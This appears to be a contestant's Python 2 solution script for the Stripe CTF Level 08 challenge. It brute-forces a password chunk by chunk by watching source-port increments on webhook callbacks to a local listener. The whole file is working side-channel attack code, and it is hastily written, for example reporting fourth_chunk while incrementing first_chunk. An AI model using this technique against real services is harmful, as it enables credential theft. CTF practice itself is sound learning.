#!/usr/bin/env python

"""
 Stripe CTF - Level 08
 Matt Fuller
 Script to check chunk server port responses to brute force key
 This script helps determine the value of each chunk individually. It must be modified between each chunk check.
 It works by making a request, checking the port increment value, and determining if the request matches the value. If so,
 it goes to the next iteration. If not, it checks again, four more times. If it fails 5 times total, the script is stopped
 and the chunk is listed as a possible solution.
 
 Please pardon the script, it was written hastily and can be improved in many areas :)
""" 

import socket
import urllib
import urllib2
import json

host = ''
run_port = 50010    #Change this to the port of your local (or level 2) server - the webhook returns to this port
backlog = 5
size = 1024 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind((host,run_port)) 
s.listen(backlog)

#The first hook/url set are for local testing, the second set are to be used on the production servers.
#Change user-names where needed.
#hook = "127.0.0.1:" + str(run_port)
hook = "level02-3.stripe-ctf.com:" + str(run_port)
#url = "http://127.0.0.1:3000"
url =  "https://level08-4.stripe-ctf.com/user-xxx/"
port_increment = 2  #set to incremenet. First chunk is 2, second chunk 3, etc.

first_chunk, second_chunk, third_chunk, fourth_chunk = "000", "000", "000", "000"
key = first_chunk + second_chunk + third_chunk + fourth_chunk

first_run = True        #Allows prev_port to be set on first run
prev_port = 0           #previous iterations port saved here for comparison
possible_chunk = ""     #chunk saved here if possibility is found
possible_counter = 0    #Counts number of times possible chunk is found. If > 10, saved as definite chunk

while 1:
    print "Trying key " + key
    data = json.dumps({"password": key, "webhooks": [hook]})
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    response.close()

    client, address = s.accept()
    data_recv = client.recv(size)
    if data_recv: 
        # print(data + client + address)
        port = address[1]
        print "Returned port " + str(port)
        if(first_run):
            prev_port = port
            first_run = False
            #Update key increments
            first_int = int(first_chunk);
            new_first_int = first_int + 1;
            first_chunk = str(new_first_int).zfill(3)
            key = first_chunk + second_chunk + third_chunk + fourth_chunk
        else:
            if(port == (prev_port + port_increment)):
                # Incremented correctly, not the chunk :(
                #Update key increments
                first_int = int(first_chunk);
                new_first_int = first_int + 1;
                first_chunk = str(new_first_int).zfill(3)
                key = first_chunk + second_chunk + third_chunk + fourth_chunk
                prev_port = port
            else:
                # Incremented oddly, is the chunk?
                possible_chunk = fourth_chunk
                print "POSSIBLE CHUNK: " + possible_chunk
                print "CHECKING MORE TIMES..."
                
                #Make two requests, compare ports. If proper incr, update not_counter. If not, update possible_counter
                while possible_counter < 6:
                    print "Rechecking!"
                    print "Trying key " + key
                    port_re1, port_re2 = 0, 0
                    
                    #First response
                    response_re1 = urllib2.urlopen(req)
                    response_re1.close()
                    client, address = s.accept()
                    data_recv_re1 = client.recv(size)
                    if data_recv_re1:
                        port_re1 = address[1]
                    client.close()
                    print "Made request, port returned: " + str(port_re1)
                    
                    #Second response
                    response_re2 = urllib2.urlopen(req)
                    response_re2.close()
                    client, address = s.accept()
                    data_recv_re2 = client.recv(size)
                    if data_recv_re2:
                        port_re2 = address[1]
                    client.close()
                    print "Made request, port returned: " + str(port_re2)
                    
                    if(port_re2 == (port_re1 + port_increment)):
                        print "Well, that wasn't it."
                        break
                    else:
                        possible_counter += 1
                    
                if(possible_counter > 4):
                    print "CHUNK IS FOUND: " + possible_chunk
                    exit()
                #Reset counters
                possible_counter = 0
                #Update key increments
                first_int = int(first_chunk);
                new_first_int = first_int + 1;
                first_chunk = str(new_first_int).zfill(3)
                key = first_chunk + second_chunk + third_chunk + fourth_chunk
                    
    client.close()